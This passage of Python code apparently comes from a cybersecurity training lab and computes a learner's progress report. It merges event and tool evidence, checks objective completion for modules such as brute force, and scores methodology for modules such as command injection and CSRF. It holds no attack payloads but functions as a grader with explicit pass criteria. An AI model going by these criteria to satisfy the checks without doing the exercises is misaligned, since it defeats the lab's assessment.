    cards: List[Dict[str, Any]] = []
    for e in reversed(raw_events):
        et = e.get("event_type")
        if et not in spec_event_types:   # skip events unrelated to this module
            continue
        if et in seen_types:
            continue
        seen_types.add(et)
        cards.append({
            "title":       _evidence_title(et),
            "description": e.get("learner_message") or "",
            "event_type":  et,
            "timestamp":   e.get("ts"),
            "severity":    e.get("severity", "info"),
            "module_id":   e.get("module_id"),
            "via":         e.get("via", "unknown"),
            "counts":      (
                _is_brute_force_event_for_mode(e, is_lab=is_lab)
                if module_id == "brute_force"
                else _event_counts_for_mode(e, is_lab=is_lab)
            ),
            "extra":       e.get("extra", {}),
        })
    cards.sort(key=lambda c: c.get("timestamp") or 0, reverse=True)

    # ── Append tool evidence from Lab Mode ──────────────────────────────────
    # If the learner used the AttackBox terminal, those commands are recorded
    # in operator_api. Merge them into evidence cards so Check Progress shows
    # a unified view of all learner activity.
    try:
        from backend import operator_api
        tool_events = operator_api.get_tool_evidence(since=mission_started_at)
        for te in tool_events:
            if session_id and te.get("session_id") and te.get("session_id") != session_id:
                continue
            # Filter by module_id if the tool command was tagged
            if te.get("module_id") and te["module_id"] != module_id:
                continue
            cards.append({
                "title":       _evidence_title(te.get("event_type", "tool_command_observed")),
                "description": te.get("learner_message", ""),
                "event_type":  te.get("event_type", "tool_command_observed"),
                "timestamp":   te.get("ts"),
                "severity":    te.get("severity", "info"),
                "module_id":   te.get("module_id"),
                "via":         te.get("via") or "attackbox",
                "counts":      True,
                "extra":       {
                    "tool": te.get("tool"),
                    "command": te.get("command", "")[:80],
                    **(te.get("extra") or {}),
                },
            })
    except ImportError:
        pass  # operator_api not available — skip tool evidence
    cards.sort(key=lambda c: c.get("timestamp") or 0, reverse=True)

    # ── Objective-based completion (the core of the objective model) ─────────
    # COMPLETION depends only on reaching the objective through the gated
    # channel, NOT on finishing the recommended methodology ladder.
    brute_force_activity = None
    if module_id == "brute_force":
        # Keep the stricter, already-verified brute-force completion.
        brute_force_activity = _brute_force_activity(events_for_progress, is_lab=is_lab)
        success = (
            brute_force_activity["failed_attempt_count"] >= BRUTE_FORCE_MIN_FAILURES
            and brute_force_activity["credential_found"]
        )
        completion = {
            "reached": success,
            "score": 100 if success else int(round(
                100 * min(brute_force_activity["failed_attempt_count"] / BRUTE_FORCE_MIN_FAILURES, 1.0)
            )),
            "completed_required": (
                [_evidence_title("brute_force_pattern"), _evidence_title("credential_found")]
                if success else []
            ),
        }
    else:
        completion = _completion_report(module_id, events_for_progress)
        success = completion["reached"]

    # ── Learning QUALITY (methodology) — scored, never blocks completion ─────
    # Matched against ALL module events (any channel) so browser-based inspection
    # still earns methodology credit.
    quality_event_types: set = set()
    for qt in OBJECTIVE_SPECS.get(module_id, {}).get("quality_tasks", []):
        quality_event_types.update(qt.get("event_types", []))
    for g in OBJECTIVE_SPECS.get(module_id, {}).get("completion_groups", []):
        quality_event_types.update(g)
    module_known_types = spec_event_types | quality_event_types
    module_events = [e for e in raw_events if e.get("event_type") in module_known_types]
    quality = _quality_report(module_id, module_events)

    # ── Safety / channel warnings (non-blocking) ─────────────────────────────
    warnings: List[str] = []
    if is_lab:
        objective_types = {t for g in OBJECTIVE_SPECS.get(module_id, {}).get("completion_groups", []) for t in g}
        counted_ids = {id(e) for e in events_for_progress}
        uncounted_objective = [
            e for e in module_events
            if e.get("event_type") in objective_types and id(e) not in counted_ids
        ]
        if uncounted_objective and not success:
            vias = sorted({str(e.get("via") or "unknown") for e in uncounted_objective})
            warnings.append(
                "You reached the objective outside the approved channel "
                f"({', '.join(vias)}). In Operator Mode, redo it on the /op/ route "
                "through ZAP Repeater/Fuzzer or the AttackBox so it counts."
            )
        if any(str(e.get("via") or "") == "unknown" for e in module_events):
            warnings.append(
                "Some requests came from an unrecognized source and were ignored — "
                "drive the attack from ZAP or the AttackBox."
            )

    # ── Next recommended action (advisory, never a solution) ─────────────────
    if quality["missing"]:
        next_action = quality["missing"][0]["recommendation"]
    elif not success:
        next_action = OBJECTIVE_SPECS.get(module_id, {}).get("objective")
    else:
        next_action = None

    progress_percent = int(round(100 * len(completed_idx) / max(len(tasks_out), 1)))

    if success:
        # Objective reached. Distinguish a clean run from one that skipped
        # recommended methodology so the student knows they can finish now.
        if quality["missing"]:
            msg = (
                "Attack objective reached. You can view the report now, or keep "
                "improving your methodology score — "
                f"{quality['score']}% of the recommended steps were observed."
            )
        else:
            msg = "Attack objective reached with strong methodology. View your report."
    elif is_lab:
        if completion["score"] >= 50:
            msg = "Close — you're near the objective. Confirm the result through ZAP/AttackBox."
        elif completion["score"] > 0:
            msg = "Lab mode: keep driving the attack from the Terminal or ZAP toward the objective."
        else:
            msg = "Lab mode: open the Terminal or ZAP and work toward the objective."
    else:
        if completion["score"] >= 50:
            msg = "Good progress — one more step reaches the attack objective."
        elif completion["score"] > 0:
            msg = "You're on your way. Follow the recommended methodology toward the objective."
        else:
            msg = "Start the mission and interact with the target environment."

    return {
        "module_id":           module_id,
        "mode":                mode,
        "variant_id":          variant_id_out,
        "variant_name":        (variant or {}).get("name"),
        "variant_difficulty":  (variant or {}).get("difficulty"),
        "variant_description": (variant or {}).get("description"),
        "variant_overview":    (walkthrough or {}).get("overview"),
        "progress_percent":    progress_percent,
        "completed_tasks":     completed_idx,
        "tasks":               tasks_out,
        "evidence":            cards,
        "success":             success,
        "learner_message":     msg,
        "defensive_insight":   spec.get("defensive_insight"),
        "events_examined":     len(raw_events),
        "brute_force_activity": brute_force_activity,

        # ── Objective-based progress model ──────────────────────────────────
        # Mission success == objective reached (the `success` field above).
        # Quality is advisory and never blocks completion.
        "objective":             OBJECTIVE_SPECS.get(module_id, {}).get("objective"),
        "completion_score":      completion["score"],
        "quality_score":         quality["score"],
        "completed_required":    completion["completed_required"],
        "completed_quality":     quality["completed"],
        "missing_quality":       quality["missing"],
        "warnings":              warnings,
        "next_recommended_action": next_action,
    }


def _evidence_title(event_type: Optional[str]) -> str:
    titles = {
        "portal_visited":              "Portal visited",
        "route_discovered":            "Route discovered",
        "hidden_clue_accessed":        "Hidden clue accessed",
        "login_failed":                "Failed login observed",
        "login_success":               "Successful login observed",
        "brute_force_pattern":         "Brute-force pattern detected",
        "credential_found":            "Valid credential confirmed",
        "search_used":                 "Search feature used",
        "xss_payload_observed":        "XSS-shaped payload submitted",
        "reflected_input_detected":    "Reflected input observed",
        "diagnostics_used":            "Diagnostics form used",
        "command_separator_observed":  "Shell metacharacters observed",
        "command_injection_detected":  "Command injection confirmed",
        "file_viewer_used":            "File viewer used",
        "traversal_pattern_observed":  "Path traversal observed",
        "sensitive_file_disclosed":    "Sensitive file disclosed",
        "file_upload_used":            "File upload form used",
        "file_saved":                  "File saved on the server",
        "dangerous_extension_accepted": "Dangerous extension accepted",
        "unrestricted_upload_detected": "Unrestricted upload confirmed",
        "profile_update_used":         "Profile update used",
        "csrf_token_missing":          "Profile update without a CSRF token",
        "csrf_lure_visited":           "Attacker lure page visited",
        "csrf_lure_submitted":         "Forged form submitted from lure page",
        "profile_changed_without_csrf": "Profile changed without CSRF protection",
        "tool_command_observed":       "Lab tool command executed",
        "tool_used":                   "Lab tool used",
        "zap_repeater_request":        "ZAP Repeater request sent",
        "zap_fuzzer_started":          "ZAP Fuzzer started",
        "zap_fuzzer_payload_tested":   "ZAP Fuzzer payload tested",
        "zap_fuzzer_completed":        "ZAP Fuzzer completed",
        "zap_fuzzer_match_found":      "ZAP Fuzzer match found",
        "recon_sequence_observed":     "Recon sequence detected",
    }
    return titles.get(event_type or "", str(event_type or "unknown"))
